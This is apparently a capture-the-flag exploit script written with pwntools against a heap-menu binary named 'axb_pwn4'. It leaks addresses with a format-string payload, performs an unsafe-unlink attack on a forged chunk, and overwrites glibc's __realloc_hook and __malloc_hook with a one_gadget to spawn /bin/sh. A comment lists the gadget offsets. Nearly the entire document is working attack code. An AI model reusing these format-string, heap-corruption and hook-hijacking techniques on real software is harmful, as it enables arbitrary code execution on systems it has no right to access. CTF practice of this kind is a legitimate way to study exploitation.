#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'axb_pwn4'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(idx, size, data):
	sla('>> ', str(1))
	sla('(0-10):', str(idx))
	sla('size:', str(size))
	sa('content:', data)

def rm(idx):
	sla('>> ', str(2))
	sla(':', str(idx))

def md(idx, data):
	sla('>> ', str(4))
	sla('index:', str(idx))
	sa(':', data)

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	# leak libc
	p = '%14$p'
	p += '%15$p'
	sla('name: ', p)

	ru('0x')
	exe.address = int(r(12), 16) - 0x1200
	key_addr = exe.address + 0x202040
	li('exe_base ' + hex(exe.address))

	ru('0x')
	lib.address = int(r(12), 16) - lib.sym['__libc_start_main'] - 240
	li('libc_base ' + hex(lib.address))
	plist = 0x202060 + exe.address
	li('plist_addr ' + hex(plist))

	#ad(0, 0x608, 'A' * 0x609)
	#ad(0, 0x108, 'A' * 0x109)

	ad(0, 0x88, 'A\n')
	ad(1, 0x88, 'A\n')

	ad(2, 0x88, 'A\n')
	ad(3, 0x88, 'A' * 0x89)

	p = p64(0x0)
	p += p64(0x80)
	p += p64(plist + 0x20 - 0x18)
	p += p64(plist + 0x20 - 0x10)
	p += p64(0x80)
	p = p.ljust(0x80, '\x00')
	p += p64(0x80)
	p += '\x90'
	md(2, p)
	# unlink
	malloc_hook = lib.sym['__malloc_hook']
	realloc_hook = lib.sym['__realloc_hook']
	realloc = lib.sym['realloc']
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[1]
	rm(3)
	p = p64(0x88)
	p += p64(realloc_hook)
	p += '\x10\x0a'
	md(2, p)

	li('plist_addr ' + hex(plist))

	# modify realloc_hook as one_gadget
	p = p64(one_gadget)
	p += '\n'
	md(1, p)


	p = p64(0x88)
	p += p64(malloc_hook)
	p += '\x10\x0a'
	md(2, p)

	# modify malloc_hook as realloc_addr
	p = p64(realloc + 8)
	p += '\n'
	md(1, p)
	
	sla('>> ', str(1))
	sla('(0-10):', str(6))
	sla('size:', str(0x88))

	#db()
	
	
def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''
